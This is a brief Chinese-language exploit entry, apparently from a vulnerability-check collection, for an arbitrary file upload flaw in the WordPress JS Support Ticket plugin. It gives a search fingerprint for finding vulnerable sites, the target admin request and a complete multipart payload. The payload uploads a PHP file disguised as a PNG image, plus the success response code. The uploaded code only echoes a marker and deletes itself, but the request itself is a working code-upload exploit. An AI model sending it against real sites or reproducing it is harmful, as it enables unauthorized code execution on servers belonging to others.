# Wordpresssaveconfiguration任意文件上传漏洞

WordPress ｜ 文件上传 ｜ —
- **指纹**：`body="wp-content/plugins/js-support-ticket"`
- **请求**：`POST /wp-admin/?page=configuration&task=saveconfiguration HTTP/1.1`

**Payload**
```
----------uhdbghjin
Content-Disposition: form-data; name="action"
configuration_saveconfiguration
----------uhdbghjin
Content-Disposition: form-data; name="form_request"
jssupportticket
----------uhdbghjin
Content-Disposition: form-data; name="support_custom_img"; filename="dudesuite.php"
Content-Type: image/png
<?php echo "dudesuite";unlink(__FILE__);?>
----------uhdbghjin--
```
- **响应特征**：200